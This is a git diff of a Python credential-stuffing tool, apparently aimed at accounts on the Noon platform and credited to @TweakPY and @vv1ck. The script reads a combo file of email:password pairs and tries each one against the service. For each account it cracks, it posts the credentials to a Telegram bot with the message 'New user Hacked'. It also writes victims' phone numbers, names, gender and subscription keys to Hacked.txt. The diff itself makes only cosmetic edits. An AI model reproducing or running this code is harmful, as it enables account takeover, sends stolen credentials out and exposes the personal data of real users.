@@ -13,15 +13,14 @@ def header():
                 By @TweakPY - @vv1ck                                         
 """)
 def saver(user,pess,rq):
-    ID=''#telegram id
-    token=''#telegram bot token
+    ID=''#Telegram id
+    token=''#Telegram bot token
     try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=• New user Hacked {user}:{pess} 🦦\n\nBy\t@TweakPY\t-\t@vv1ck')
     except:pass
     try:
         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']
         with open('Hacked.txt', 'a') as x:
-            acc=f'USR []\nPhone Num:[{phone}]\nLast Name:[{lN}]\nlanguage:[{lc}]\nJoin Date:[{jD}]\nGender:[{gr}]\nFirst Name:[{fnm}]\nEmail:[{user}]\nPassword:[{pess}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]\n\n'
-            x.write(acc)
+            x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\nName:[{fnm} {lN}]\nPhone Number:[{phone}]\nJoin Date:[{jD}]\nender:[{gr}]\nLanguage:[{lc}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]\n\n')
     except Exception as i:
         with open('Hacked.txt', 'a') as x:
             x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\n')
@@ -33,10 +32,8 @@ def Brute_Force_Noon(user,pess):
     except KeyboardInterrupt:exit()
 def O_File():
     FL=input('[+] Combo File Name : ')
-    count=0
     try:
         for x in open(FL,'r').read().splitlines():
-            count+=1
             user=x.split(":")[0]
             pess=x.split(":")[1];sleep(5);Brute_Force_Noon(user,pess)
     except IndexError:exit()
